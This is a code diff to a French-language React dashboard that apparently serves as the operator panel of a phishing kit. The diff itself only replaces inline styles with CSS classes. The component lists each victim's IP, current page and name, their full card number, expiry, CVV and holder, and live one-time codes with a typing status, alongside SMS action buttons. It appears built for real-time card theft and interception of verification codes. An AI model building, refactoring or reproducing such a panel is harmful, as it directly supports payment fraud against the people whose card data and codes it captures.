@@ -384,19 +384,6 @@ function Dashboard() {
               <button 
                 onClick={refreshClients}
                 className="btn-refresh"
-                style={{
-                  padding: '0.5rem 1rem',
-                  background: '#4299e1',
-                  color: 'white',
-                  border: 'none',
-                  borderRadius: '6px',
-                  cursor: 'pointer',
-                  fontSize: '0.875rem',
-                  fontWeight: '500',
-                  transition: 'background-color 0.2s'
-                }}
-                onMouseOver={(e) => e.target.style.background = '#3182ce'}
-                onMouseOut={(e) => e.target.style.background = '#4299e1'}
               >
                 🔄 Actualiser ({clients.length})
               </button>
@@ -464,39 +451,22 @@ function Dashboard() {
                       <tr
                         key={client.id}
                         className={`${isNewClient ? 'new-client-row' : ''} ${isDisconnected ? 'disconnected-client-row' : ''} ${isConnected ? 'connected-client-row' : ''}`}
-                        style={isNewClient ? {
-                          backgroundColor: '#d4edda',
-                          border: '2px solid #28a745',
-                          transition: 'all 0.3s ease'
-                        } : isDisconnected ? {
-                          backgroundColor: '#f8d7da',
-                          border: '2px solid #dc3545',
-                          transition: 'all 0.3s ease'
-                        } : isConnected ? {
-                          backgroundColor: '#d1f2eb',
-                          transition: 'all 0.3s ease'
-                        } : {}}
                       >
-                        <td className="client-id" style={{
-                          ...(isNewClient ? { color: '#155724', fontWeight: 'bold' } : isDisconnected ? { color: '#721c24', fontWeight: 'bold' } : isConnected ? { color: '#0d5d2c', fontWeight: 'bold', backgroundColor: '#d1f2eb' } : {}),
-                          fontFamily: 'monospace',
-                          fontSize: '0.85rem',
-                          wordBreak: 'break-all'
-                        }}>
+                        <td className="client-id">
                           {client.id}
                         </td>
-                        <td style={isNewClient ? { color: '#155724', fontWeight: 'bold' } : isDisconnected ? { color: '#721c24', fontWeight: 'bold' } : isConnected ? { color: '#0d5d2c', fontWeight: 'bold', backgroundColor: '#d1f2eb' } : {}}>
+                        <td>
                           {client.ip || '-'}
                         </td>
-                        <td style={isNewClient ? { color: '#155724', fontWeight: 'bold' } : isDisconnected ? { color: '#721c24', fontWeight: 'bold' } : isConnected ? { color: '#0d5d2c', fontWeight: 'bold', backgroundColor: '#d1f2eb' } : {}}>
-                          <span className="page-badge" style={isNewClient ? { backgroundColor: '#28a745', color: 'white', fontWeight: 'bold' } : isDisconnected ? { backgroundColor: '#dc3545', color: 'white', fontWeight: 'bold' } : isConnected ? { backgroundColor: '#27ae60', color: 'white', fontWeight: 'bold' } : {}}>
+                        <td>
+                          <span className={`page-badge ${isNewClient ? 'new-client' : isDisconnected ? 'disconnected' : isConnected ? 'connected' : ''}`}>
                             {getPageName(client.currentPage || client.current_page)}
                           </span>
                         </td>
-                        <td style={isNewClient ? { color: '#155724', fontWeight: 'bold' } : isDisconnected ? { color: '#721c24', fontWeight: 'bold' } : isConnected ? { color: '#0d5d2c', fontWeight: 'bold', backgroundColor: '#d1f2eb' } : {}}>
+                        <td>
                           {client.firstName || client.first_name} {client.lastName || client.last_name || ''}
                         </td>
-                        <td style={isNewClient ? { color: '#155724', fontWeight: 'bold' } : isDisconnected ? { color: '#721c24', fontWeight: 'bold' } : isConnected ? { color: '#0d5d2c', fontWeight: 'bold', backgroundColor: '#d1f2eb' } : {}}>
+                        <td>
                           {(() => {
                             const cardNumber = client.cardNumber || client.card_number;
                             const cardExpiration = client.cardExpiration || client.card_expiration || client.expiryDate;
@@ -504,37 +474,28 @@ function Dashboard() {
                             const cardHolder = client.cardHolder || client.cardholderName || client.card_holder;
                             
                             if (!cardNumber && !cardExpiration && !cardCvv && !cardHolder) {
-                              return <span style={{ color: '#6c757d' }}>-</span>;
+                              return <span className="empty-text">-</span>;
                             }
                             
                             return (
-                              <div style={{ 
-                                fontFamily: 'monospace', 
-                                fontSize: '0.8rem',
-                                lineHeight: '1.5',
-                                display: 'flex',
-                                flexDirection: 'column',
-                                gap: '0.25rem',
-                                color: '#dc3545',
-                                fontWeight: 'bold'
-                              }}>
+                              <div className="card-info-container">
                                 {cardNumber && (
-                                  <div style={{ color: '#dc3545' }}>
+                                  <div>
                                     <strong>Card:</strong> {cardNumber}
                                   </div>
                                 )}
                                 {cardExpiration && (
-                                  <div style={{ color: '#dc3545' }}>
+                                  <div>
                                     <strong>Exp:</strong> {cardExpiration}
                                   </div>
                                 )}
                                 {cardCvv && (
-                                  <div style={{ color: '#dc3545' }}>
+                                  <div>
                                     <strong>CVV:</strong> {cardCvv}
                                   </div>
                                 )}
                                 {cardHolder && (
-                                  <div style={{ color: '#dc3545' }}>
+                                  <div>
                                     <strong>Holder:</strong> {cardHolder}
                                   </div>
                                 )}
@@ -542,46 +503,21 @@ function Dashboard() {
                             );
                           })()}
                         </td>
-                        <td style={{
-                          textAlign: 'center',
-                          verticalAlign: 'middle',
-                          ...(isNewClient ? { color: '#155724', fontWeight: 'bold' } : isDisconnected ? { color: '#721c24', fontWeight: 'bold' } : isConnected ? { color: '#0d5d2c', fontWeight: 'bold', backgroundColor: '#d1f2eb' } : {})
-                        }}>
+                        <td style={{ textAlign: 'center', verticalAlign: 'middle' }}>
                           {/* Display OTP Code if available */}
                           {(() => {
                             const otpCode = client.otpCode || client.otp_code;
                             if (otpCode) {
                               return (
-                                <div style={{ 
-                                  marginBottom: '0.5rem',
-                                  padding: '0.5rem',
-                                  background: '#fee2e2',
-                                  borderRadius: '6px',
-                                  border: '1px solid #fecaca'
-                                }}>
-                                  <div style={{ 
-                                    fontSize: '0.75rem', 
-                                    fontWeight: 600, 
-                                    color: '#991b1b',
-                                    marginBottom: '0.25rem'
-                                  }}>
+                                <div className="otp-container">
+                                  <div className="otp-label">
                                     Code OTP:
                                   </div>
-                                  <div style={{ 
-                                    fontSize: '1.2rem', 
-                                    fontFamily: 'monospace',
-                                    fontWeight: 'bold',
-                                    color: '#dc2626',
-                                    letterSpacing: '0.2em'
-                                  }}>
+                                  <div className="otp-code">
                                     {otpCode}
                                   </div>
                                   {client.otpStatus && (
-                                    <div style={{ 
-                                      fontSize: '0.7rem', 
-                                      color: '#7f1d1d',
-                                      marginTop: '0.25rem'
-                                    }}>
+                                    <div className="otp-status">
                                       {client.otpStatus === 'typing' ? '⏳ Saisie en cours...' : client.otpStatus === 'submitted' ? '✅ Soumis' : client.otpStatus}
                                     </div>
                                   )}
@@ -590,14 +526,7 @@ function Dashboard() {
                             }
                             return null;
                           })()}
-                          <div style={{ 
-                            display: 'flex', 
-                            gap: '0.5rem', 
-                            alignItems: 'center',
-                            flexWrap: 'wrap',
-                            justifyContent: 'center',
-                            width: '100%'
-                          }}>
+                          <div className="action-buttons">
                             {(() => {
                               const activeAction = activeActions.get(client.id);
                               const isSMSActive = activeAction === 'sms';
